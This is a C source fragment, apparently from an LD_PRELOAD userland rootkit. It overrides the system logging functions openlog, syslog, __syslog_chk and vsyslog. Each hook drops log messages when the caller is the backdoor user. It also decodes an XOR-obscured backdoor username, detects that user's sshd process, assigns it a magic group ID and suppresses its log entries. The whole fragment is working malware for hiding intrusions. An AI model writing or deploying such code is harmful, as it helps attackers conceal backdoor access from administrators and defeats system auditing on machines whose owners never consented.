/*
 *
 * int find_psysdproc();
 * if(getpid() == find_psysdproc())
 * &&
 * !strstr()
 *
 */

void openlog(const char *ident, int option, int facility)
{
    if(is_bdusr()) return;
    HOOK(o_openlog,COPENLOG);
    o_openlog(ident, option, facility);
    return;
}

void syslog(int priority, const char *format, ...)
{
    if(is_bdusr()) return;

    char sshds[64], *bduname=strdup(BD_UNAME); xor(bduname);
    snprintf(sshds, sizeof(sshds), "sshd: %s", bduname);
    CLEAN(bduname);
    if(strstr(cprocname(), sshds)) { setgid(MGID); return; }

    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
    return;
}

void __syslog_chk(int priority, int flag, const char *format, ...)
{
    if(is_bdusr()) return;

    char sshds[64], *bduname=strdup(BD_UNAME); xor(bduname);
    snprintf(sshds, sizeof(sshds), "sshd: %s", bduname);
    CLEAN(bduname);
    if(strstr(cprocname(),sshds)) { setgid(MGID); return; }

    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
    return;
}

void vsyslog(int priority, const char *format, va_list ap)
{
    if(is_bdusr()) return;

    char sshds[64], *bduname=strdup(BD_UNAME); xor(bduname);
    snprintf(sshds, sizeof(sshds), "sshd: %s", bduname);
    CLEAN(bduname);
    if(strstr(cprocname(),sshds)) { setgid(MGID); return; }

    HOOK(o_vsyslog,CVSYSLOG);
    o_vsyslog(priority,format,ap);
    return;
}
